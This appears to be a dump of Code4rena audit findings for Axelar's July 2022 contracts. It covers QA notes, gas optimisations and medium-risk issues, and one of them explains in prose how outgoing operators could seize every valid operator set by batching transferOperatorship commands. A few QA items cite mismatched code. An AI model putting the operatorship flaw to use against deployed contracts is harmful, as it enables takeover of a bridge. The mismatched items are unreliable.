 **Recommendation**: Naming conventions utilized by the linked statements are adjusted to reflect the correcttype of declaration according to the Solidity style guide.   ## [NAZ-N3] Missing Use of `solhint-disable-next-line` **Severity**: Informational **Context**:[`AxelarGateway.sol#L157`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L157), [`AxelarGateway.sol#L229`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L229), [`AxelarGateway.sol#L320`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L320), [`AxelarGateway.sol#L344`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L344), [`AxelarGateway.sol#L461`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L461), [`AxelarGateway.sol#L615`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L615), [`AxelarAuthWeighted.sol#L101`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L101)  **Description**: `solhint-disable-next-line` is used elsewhere for small linter errors and can be used here to disable these errors.  **Recommendation**: Consider adding `solhint-disable-next-line`.   ## [NAZ-N4] Commented Out Code **Severity**: Informational **Context**: [`AxelarGateway.sol#L22-L24`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L22-L24)  **Description**: There is commented code that makes the code messy and unneeded.   **Recommendation**: Remove the commented out code.   ## [NAZ-N5] Floating Pragma **Severity**: Informational **Context**: [`IAxelarGasService.sol`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarGasService.sol), [`IAxelarDepositService.sol`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarDepositService.sol), [`IAxelarAuthWeighted.sol`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarAuthWeighted.sol), [`IDepositBase.sol`](https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IDepositBase.sol)  **Description**: Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.  **Recommendation**:  Lock the pragma version.   ## [NAZ-N6] Missing or Incomplete NatSpec **Severity**: Informational **Context**: [`All Contracts`](https://github.com/code-423n4/2022-07-axelar)  **Description**: Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.  **Recommendation**: Add in full NatSpec comments for all functions to have complete code documentation for future use."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-axelar-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-axelar-findings", "body": "#  [L-01] Unused `receive()` function will lock Ether in contract :-   1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/DepositReceiver.sol#L29 :      `receive() external payable {}`       2. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositServiceProxy.sol#L13 :      `receive() external payable override {}`           #  [L-02] Missing checks for `address(0x0)` when assigning values to address state variables :-     1. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L37 :        `xc20Codehash = codehash_;`          2. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L45 :        `xc20Codehash = newCodehash;`    3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L52 :         'AUTH_MODULE = authModule;'         4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L53 :        `TOKEN_DEPLOYER_IMPLEMENTATION = tokenDeployerImplementation;`    5. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/DepositBase.sol#L24 :        `gateway = gateway_;`          6. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L27 :        `gatewayAddress = gatewayAddress_;`        #  [L-03] address.call{value:x}() should be used instead of payable.transfer() :-     1. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L63 :        `payable(msg.sender).transfer(address(this).balance);`          #  [L-04] approve should be replaced with safeApprove or safeIncreaseAllowance() / safeDecreaseAllowance() :-     1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L30 :        `IERC20(wrappedTokenAddress).approve(gateway, amount);`          2. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/ReceiverImplementation.sol#L38 :        `IERC20(tokenAddress).approve(gateway, amount);`    3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/ReceiverImplementation.sol#L64 :         'IERC20(wrappedTokenAddress).approve(gateway, amount);'                #  [L-05] Low level calls don\u2019t check for contract existence :-     1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L320 :        `(bool success, ) = address(this).call(abi.encodeWithSelector(commandSelector, params[i], commandId));`          2. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L460#L463 :        `function _callERC20Token(address tokenAddress, bytes memory callData) internal returns (bool) {         (bool success, bytes memory returnData) = tokenAddress.call(callData);         return success && (returnData.length == uint256(0) || abi.decode(returnData, (bool)));     }`    3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L158 :         '(bool success, bytes memory returnData) = tokenAddress.call(abi.encodeWithSelector(IERC20.transfer.selector, receiver, amount));'         4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L172#L174 :        `(bool success, bytes memory returnData) = tokenAddress.call(             abi.encodeWithSelector(IERC20.transferFrom.selector, from, address(this), amount)         );`    5. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/DepositBase.sol#L71 :        `(bool success, bytes memory returnData) = tokenAddress.call(abi.encodeWithSelector(IERC20.transfer.selector, receiver, amount));`          6. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L95 :        `(bool success, bytes memory returnData) = tokenAddress.call(abi.encodeWithSelector(IERC20.transfer.selector, receiver, amount));`    7. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L106#L108 :        `(bool success, bytes memory returnData) = tokenAddress.call(             abi.encodeWithSelector(IERC20.transferFrom.selector, from, address(this), amount)         );`               #  [L-06] an unbounded loop on array can lead to DoS :-     1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L123L#124 :        `for (uint256 i; i < tokens.length; i++) {             address token = tokens[i];`          2. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L168#L169 :        `for (uint256 i; i < refundTokens.length; i++) {             refundToken = refundTokens[i];`    3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L116#L120 :         'for (uint256 i; i < accounts.length - 1; ++i) {             if (accounts[i] >= accounts[i + 1]) {                 return false;             }         }'                 #  [N-01] Adding a return statement when the function defines a named return variable, is redundant:-   1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L182 :      `return _adminEpoch();`          #  [N-02] require()/revert() statements should have descriptive reason strings :-   1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L55#L58 :      ` revert('NotAxelarToken()');       revert('NotXc20Token()');       revert('AlreadyWrappingAxelarToken()');       revert('AlreadyWrappingXC20Token()');`       2. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L60#L61 :      `revert('NotOwner()');      revert('CannotSetMetadata()');`  3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L68 :       'revert('NotAxelarToken()');'       4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L70 :      `revert('NotWrappingToken()');`  1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L78#L79 :      `revert('NotAxelarToken()');      revert('CannotMint()');`       2. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L84#L86 :      `revert('NotXc20Token()');      revert('InsufficientBalance()');      revert('CannotBurn()');`  3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L98 :       'revert('TransferFailed()');'       4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L111 :      `revert('TransferFailed()');`         #  [N-03] Use a more recent version of solidity (Use a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`) :-   1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L3 :      `pragma solidity 0.8.9;`          2. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L3 :      `pragma solidity 0.8.9;`  3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/DepositBase.sol#L3 :       'pragma solidity 0.8.9;'                #  [N-04] Event is missing indexed fields (Each `event` should use three `indexed` fields if there are three or more fields) :-   1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarGasService.sol#L13#L57 :      `    event GasPaidForContractCall(         address indexed sourceAddress,         string destinationChain,         string destinationAddress,         bytes32 indexed payloadHash,         address gasToken,         uint256 gasFeeAmount,         address refundAddress     );      event GasPaidForContractCallWithToken(         address indexed sourceAddress,         string destinationChain,         string destinationAddress,         bytes32 indexed payloadHash,         string symbol,         uint256 amount,         address gasToken,         uint256 gasFeeAmount,         address refundAddress     );      event NativeGasPaidForContractCall(         address indexed sourceAddress,         string destinationChain,         string destinationAddress,         bytes32 indexed payloadHash,         uint256 gasFeeAmount,         address refundAddress     );      event NativeGasPaidForContractCallWithToken(         address indexed sourceAddress,         string destinationChain,         string destinationAddress,         bytes32 indexed payloadHash,         string symbol,         uint256 amount,         uint256 gasFeeAmount,         address refundAddress     );      event GasAdded(bytes32 indexed txHash, uint256 indexed logIndex, address gasToken, uint256 gasFeeAmount, address refundAddress);      event NativeGasAdded(bytes32 indexed txHash, uint256 indexed logIndex, uint256 gasFeeAmount, address refundAddress);`          2. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarAuthWeighted.sol#L14 :      `event OperatorshipTransferred(address[] newOperators, uint256[] newWeights, uint256 newThreshold);`        #  [N-05] Use of sensitive/non-inclusive terms :-   1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L496 :      `bool burnSuccess;`                   #  [N-06] public functions not called by the contract should be declared external instead () :-   1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L152#L178 :      `    function tokenDailyMintLimit(string memory symbol) public view override returns (uint256) {         return getUint(_getTokenDailyMintLimitKey(symbol));     }      function tokenDailyMintAmount(string memory symbol) public view override returns (uint256) {         return getUint(_getTokenDailyMintAmountKey(symbol, block.timestamp / 1 days));     }      function allTokensFrozen() external pure override returns (bool) {         return false;     }      function implementation() public view override returns (address) {         return getAddress(KEY_IMPLEMENTATION);     }      function tokenAddresses(string memory symbol) public view override returns (address) {         return getAddress(_getTokenAddressKey(symbol));     }      function tokenFrozen(string memory) external pure override returns (bool) {         return false;     }      function isCommandExecuted(bytes32 commandId) public view override returns (bool) {         return getBool(_getIsCommandExecutedKey(commandId));     }`          2. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L56#L61 :      `  function addressForNativeDeposit(         bytes32 salt,         address refundAddress,         string calldata destinationChain,         string calldata destinationAddress     ) public view returns (address) {`  3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L241 :       'function contractId() public pure returns (bytes32) {'  4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/DepositBase.sol#L41#L47 :      `    function wrappedToken() public view returns (address) {         return IAxelarGateway(gateway).tokenAddresses(wrappedSymbol());     }      // @dev Converts bytes32 from immutable storage into a string     function wrappedSymbol() public view returns (string memory symbol) {         bytes32 symbolData = wrappedSymbolBytes;`  5. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L30#L32 :       'function gateway() public view override returns (IAxelarGateway) {         return IAxelarGateway(gatewayAddress);     }'  6. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L40#L42 :       '   function contractId() public pure returns (bytes32) {         return keccak256('xc20-wrapper');     }'               #  [N-07] public functions not called by the contract should be declared external instead () :-   1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IDepositBase.sol#L5 :      `interface IDepositBase {`                   #  [N-08] public functions not called by the contract should be declared external instead () :-   1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L4 :      ` uint8 internal constant OLD_KEY_RETENTION = 16;`             #  [N-09] Use a more recent version of solidity :-   1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L1 :      `// SPDX-License-Identifier: MIT`       2. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IDepositBase.sol#L1 :      `// SPDX-License-Identifier: MIT`  3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L1 :       '// SPDX-License-Identifier: MIT'       4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasServiceProxy.sol#L1 :      `// SPDX-License-Identifier: MIT`  5. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarAuth.sol#L1 :      `// SPDX-License-Identifier: MIT`       6. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarGasService.sol#L1 :      `// SPDX-License-Identifier: MIT`  7. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarDepositService.sol#L1 :       '// SPDX-License-Identifier: MIT'       8. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarAuthWeighted.sol#L1 :      `// SPDX-License-Identifier: MIT`             9. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/DepositReceiver.sol#L1 :      `// SPDX-License-Identifier: MIT`       10. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L1 :      `// SPDX-License-Identifier: MIT`  11. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/DepositBase.sol#L1 :       '// SPDX-License-Identifier: MIT'       12. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/ReceiverImplementation.sol#L1 :      `// SPDX-License-Identifier: MIT`  13. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositServiceProxy.sol#L1 :      `// SPDX-License-Identifier: MIT`       14. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L1 :      `// SPDX-License-Identifier: MIT`  15. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L1 :       '// SPDX-License-Identifier: MIT' "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-axelar-findings/issues/52", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-axelar-findings", "body": "**AxelarGasServiceProxy** - L6 - The IUpgradable interface is imported but is never used.  **DepositBase** - L7 - The IWETH9 interface is imported but is never used.  "}, {"title": "removeWrapping can be called when there are still wrapped tokens", "html_url": "https://github.com/code-423n4/2022-07-axelar-findings/issues/23", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-07-axelar-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-axelar/blob/a1205d2ba78e0db583d136f8563e8097860a110f/xc20/contracts/XC20Wrapper.sol#L66   # Vulnerability details  ## Impact An owner can call `removeWrapping`, even if there are still circulating wrapped tokens. This will cause the unwrapping of those tokens to fail, as `unwrapped[wrappedToken]` will be `addres(0)`.  ## Recommended Mitigation Steps Track how many wrapped tokens are in circulation, only allow the removal of a wrapped tokens when there are 0 to ensure for users that they will always be able to unwrap."}, {"title": "Change of operators possible from old operators", "html_url": "https://github.com/code-423n4/2022-07-axelar-findings/issues/19", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-07-axelar-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-axelar/blob/3373c48a71c07cfce856b53afc02ef4fc2357f8c/contracts/AxelarGateway.sol#L268 https://github.com/code-423n4/2022-07-axelar/blob/3373c48a71c07cfce856b53afc02ef4fc2357f8c/contracts/AxelarGateway.sol#L311   # Vulnerability details  ## Impact According to the specifications, only the current operators should be able to transfer operatorship. However, there is one way to circumvent this. Because currentOperators is not updated in the loop, when multiple `transferOperatorship` commands are submitted in the same `execute` call, all will succeed. After the first one, the operators that signed these commands are no longer the current operators, but the call will still succeed.  This also means that one set of operators could submit so many `transferOperatorship` commands in one `execute` call that `OLD_KEY_RETENTION` is reached for all other ones, meaning they would control complete set of currently valid operators.  ## Recommended Mitigation Steps Set `currentOperators` to `false` when the operators were changed."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-axelar-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-axelar-findings", "body": "- In `refundTokenDeposit` within `AxelarDepositService`, the address of the `gatewayToken` is retrieved in every loop iteration (https://github.com/code-423n4/2022-07-axelar/blob/a46fa61e73dd0f3469c0263bc6818e682d62fb5f/contracts/deposit-service/AxelarDepositService.sol#L115). However, as this address does not change, the retrieval can be moved outside of the loop to save a lot of gas when the number of tokens is large. - In multiple for loops, the loop iteration can be marked as `unchecked` because an overflow is not possible (as the iterator is bounded): ``` ./auth/AxelarAuthWeighted.sol:        for (uint256 i; i < recentOperators.length; ++i) { ./auth/AxelarAuthWeighted.sol:        for (uint256 i = 0; i < weightsLength; ++i) { ./auth/AxelarAuthWeighted.sol:        for (uint256 i = 0; i < signatures.length; ++i) { ./auth/AxelarAuthWeighted.sol:            for (; operatorIndex < operatorsLength && signer != operators[operatorIndex]; ++operatorIndex) {} ./auth/AxelarAuthWeighted.sol:        for (uint256 i; i < accounts.length - 1; ++i) { ./gas-service/AxelarGasService.sol:        for (uint256 i; i < tokens.length; i++) { ./deposit-service/AxelarDepositService.sol:        for (uint256 i; i < refundTokens.length; i++) { ./deposit-service/AxelarDepositService.sol:        for (uint256 i; i < refundTokens.length; i++) { ./deposit-service/AxelarDepositService.sol:        for (uint256 i; i < refundTokens.length; i++) { ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-axelar-findings/issues/17", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-axelar-findings", "body": " ## Change if -> revert pattern to require  Change if -> revert pattern to 'require' to save gas and improve code quality, if (some_condition) {          revert(revert_message)  }  to: require(!some_condition, revert_message)  In the following locations:  ### Code instance:          DepositReceiver.sol, 17    ## Do not cache msg.sender   We recommend not to cache msg.sender since calling it is 2 gas while reading a variable is more.   ### Code instance:          https://github.com/code-423n4/2022-07-axelar/tree/main/contracts/Ownable.sol#L12    ## Inline one time use functions   The following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.       ### Code instances:          AdminMultisigBase.sol, _adminEpoch         AxelarGateway.sol, _setTokenDailyMintAmount         AdminMultisigBase.sol, _getVoteCount         AdminMultisigBase.sol, _hasVoted   ## State variables that could be set immutable  In the following files there are state variables that could be set immutable to save gas.   ### Code instances:          gateway in IAxelarExecutable.sol         DOMAIN_SEPARATOR in ERC20Permit.sol    ## Unused state variables  Unused state variables are gas consuming at deployment (since they are located in storage) and are  a bad code practice. Removing those variables will decrease deployment gas cost and improve code quality.  This is a full list of all the unused storage variables we found in your code base.   ### Code instance:          DepositBase.sol, refundToken    ## Unnecessary array boundaries check when loading an array element twice       There are places in the code (especially in for-each loops) that loads the same array element more than once.      In such cases, only one array boundaries check should take place, and the rest are unnecessary.     Therefore, this array element should be cached in a local variable and then be loaded     again using this local variable, skipping the redundant second array boundaries check:       ### Code instance:          AxelarAuthWeighted.sol._isSortedAscAndContainsNoDuplicate - double load of accounts[i]    ## Caching array length can save gas   Caching the array length is more gas efficient. This is because access to a local variable in solidity is more efficient than query storage / calldata / memory. We recommend to change from:          for (uint256 i=0; i<array.length; i++) { ... }  to:       uint len = array.length       for (uint256 i=0; i<len; i++) { ... }   ### Code instances:          AxelarAuthWeighted.sol, recentOperators, 17         AxelarDepositService.sol, refundTokens, 168         AxelarDepositService.sol, refundTokens, 204         AxelarGasService.sol, tokens, 123         AxelarAuthWeighted.sol, signatures, 98         AxelarGateway.sol, symbols, 207         AxelarDepositService.sol, refundTokens, 114    ## Prefix increments are cheaper than postfix increments  Prefix increments are cheaper than postfix increments.  Further more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change There is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`). But increments perform overflow checks that are not necessary in this case. These functions use not using prefix increments (`++x`) or not using the unchecked keyword:   ### Code instances:          change to prefix increment and unchecked: AxelarGasService.sol, i, 123         change to prefix increment and unchecked: AxelarGateway.sol, i, 207         just change to unchecked: AxelarAuthWeighted.sol, i, 69         just change to unchecked: AxelarAuthWeighted.sol, i, 98         just change to unchecked: AxelarAuthWeighted.sol, i, 17         just change to unchecked: AxelarGateway.sol, i, 195         change to prefix increment and unchecked: AxelarDepositService.sol, i, 114         just change to unchecked: AxelarAuthWeighted.sol, i, 116         just change to unchecked: AxelarGateway.sol, i, 292         just change to unchecked: AdminMultisigBase.sol, i, 158         change to prefix increment and unchecked: AxelarDepositService.sol, i, 168         change to prefix increment and unchecked: AxelarDepositService.sol, i, 204         just change to unchecked: AdminMultisigBase.sol, i, 51    ## Unnecessary index init   In for loops you initialize the index to start from 0, but it already initialized to 0 in default and this assignment cost gas.  It is more clear and gas efficient to declare without assigning 0 and will have the same meaning:  ### Code instances:          AxelarAuthWeighted.sol, 98         AxelarGateway.sol, 207         AxelarAuthWeighted.sol, 69    ## Use != 0 instead of > 0   Using != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)   ### Code instances:          AxelarDepositService.sol, 165: change 'balance > 0' to 'balance != 0'         ReceiverImplementation.sol, 71: change 'balance > 0' to 'balance != 0'         ReceiverImplementation.sol, 23: change 'balance > 0' to 'balance != 0'         ReceiverImplementation.sol, 51: change 'balance > 0' to 'balance != 0' "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-axelar-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-axelar-findings", "body": "#  [G-01] State variables only set in the constructor should be declared immutable:-     1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L23 :        `bytes32 public xc20Codehash;`                  #  [G-02] `x = x + y` is cheaper than `x += y` :-     1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L70 :        `totalWeight += newWeights[i];`    2. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L105:        `weight += weights[operatorIndex];`     #  [G-03] <array>.length should not be looked up in every loop of a for-loop :-     1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L207 :        `for (uint256 i = 0; i < symbols.length; i++) {`    2. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L123 :        `for (uint256 i; i < tokens.length; i++) {`          3. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L114 :        `for (uint256 i; i < refundTokens.length; i++) {`    4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L168 :        `for (uint256 i; i < refundTokens.length; i++) {`    5. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L204 :        `for (uint256 i; i < refundTokens.length; i++) {`    6. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L17 :        `for (uint256 i; i < recentOperators.length; ++i) {`          7. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L98 :        `for (uint256 i = 0; i < signatures.length; ++i) {`    8. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L116 :        ` for (uint256 i; i < accounts.length - 1; ++i) {`      #  [G-04] Use prefix not postfix in loops (Using a prefix increment (++i) instead of a postfix increment (i++) saves gas for each loop cycle and so can have a big gas impact when the loop executes on a large number of elements.) :-     1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L207 :        `for (uint256 i = 0; i < symbols.length; i++) {`    2. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L123 :        `for (uint256 i; i < tokens.length; i++) {`          3. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L114 :        `for (uint256 i; i < refundTokens.length; i++) {`    4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L168 :        `for (uint256 i; i < refundTokens.length; i++) {`    5. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L204 :        `for (uint256 i; i < refundTokens.length; i++) {`    6. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L17 :        `for (uint256 i; i < recentOperators.length; ++i) {`          7. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L98 :        `for (uint256 i = 0; i < signatures.length; ++i) {`    8. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L116 :        ` for (uint256 i; i < accounts.length - 1; ++i) {`          9. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L195 :        `for (uint256 i; i < adminCount; ++i) {`    10. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L292 :        `ffor (uint256 i; i < commandsLength; ++i) {`          11. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L69 :        `for (uint256 i = 0; i < weightsLength; ++i) {`                   #  [G-05] Not using the named return variables when a function returns, wastes deployment gas :-     1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L182 :        `return _adminEpoch();`               #  [G-06] It costs more gas to initialize variables to zero than to let the default of zero be applied :-     1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L207 :        `for (uint256 i = 0; i < symbols.length; i++) {`          2. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L98 :        `for (uint256 i = 0; i < signatures.length; ++i) {`    3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L116 :         4. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L69 :        `for (uint256 i = 0; i < weightsLength; ++i) {`                        #  [G-07] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead :-     1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L14 :        `uint8 internal constant OLD_KEY_RETENTION = 16;`                #  [G-08] Expressions for constant values such as a call to keccak256(), should use immutable rather than constant :-     1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L30#L43 :        `bytes32 internal constant PREFIX_COMMAND_EXECUTED = keccak256('command-executed');     bytes32 internal constant PREFIX_TOKEN_ADDRESS = keccak256('token-address');     bytes32 internal constant PREFIX_TOKEN_TYPE = keccak256('token-type');     bytes32 internal constant PREFIX_CONTRACT_CALL_APPROVED = keccak256('contract-call-approved');     bytes32 internal constant PREFIX_CONTRACT_CALL_APPROVED_WITH_MINT = keccak256('contract-call-approved-with-mint');     bytes32 internal constant PREFIX_TOKEN_DAILY_MINT_LIMIT = keccak256('token-daily-mint-limit');     bytes32 internal constant PREFIX_TOKEN_DAILY_MINT_AMOUNT = keccak256('token-daily-mint-amount');      bytes32 internal constant SELECTOR_BURN_TOKEN = keccak256('burnToken');     bytes32 internal constant SELECTOR_DEPLOY_TOKEN = keccak256('deployToken');     bytes32 internal constant SELECTOR_MINT_TOKEN = keccak256('mintToken');     bytes32 internal constant SELECTOR_APPROVE_CONTRACT_CALL = keccak256('approveContractCall');     bytes32 internal constant SELECTOR_APPROVE_CONTRACT_CALL_WITH_MINT = keccak256('approveContractCallWithMint');     bytes32 internal constant SELECTOR_TRANSFER_OPERATORSHIP = keccak256('transferOperatorship');`              #  [G-09] Use custom errors rather than revert()/require() strings to save deployment gas :-     1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L55#L58 :        ` revert('NotAxelarToken()');         